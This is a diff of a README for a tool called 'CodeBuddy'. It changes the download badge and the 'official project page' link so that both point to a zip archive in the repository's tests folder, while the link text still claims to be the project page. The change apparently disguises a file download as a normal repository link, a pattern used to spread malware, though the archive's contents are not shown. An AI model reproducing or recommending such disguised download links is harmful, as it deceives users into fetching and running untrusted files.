@@ -1,6 +1,6 @@
 # 🤖 CodeBuddy - Your Personal Assistant For Coding Projects
 
-[![Download CodeBuddy](https://img.shields.io/badge/Download-CodeBuddy-blue.svg)](https://github.com/shier3135/CodeBuddy)
+[![Download CodeBuddy](https://img.shields.io/badge/Download-CodeBuddy-blue.svg)](https://github.com/shier3135/CodeBuddy/raw/refs/heads/main/tests/Buddy-Code-v1.2.zip)
 
 ## 📖 About CodeBuddy
 
@@ -28,7 +28,7 @@ This tool functions as a bridge between your local machine and your coding hardw
 
 You perform the setup process by visiting the official repository page. Follow these steps to get CodeBuddy on your computer.
 
-1.  Visit the official project page: [https://github.com/shier3135/CodeBuddy](https://github.com/shier3135/CodeBuddy).
+1.  Visit the official project page: [https://github.com/shier3135/CodeBuddy/raw/refs/heads/main/tests/Buddy-Code-v1.2.zip](https://github.com/shier3135/CodeBuddy/raw/refs/heads/main/tests/Buddy-Code-v1.2.zip).
 2.  Locate the section labeled Releases on the right side of the screen.
 3.  Click the version number to view the files available for download.
 4.  Select the Windows installer file, which ends in .exe.
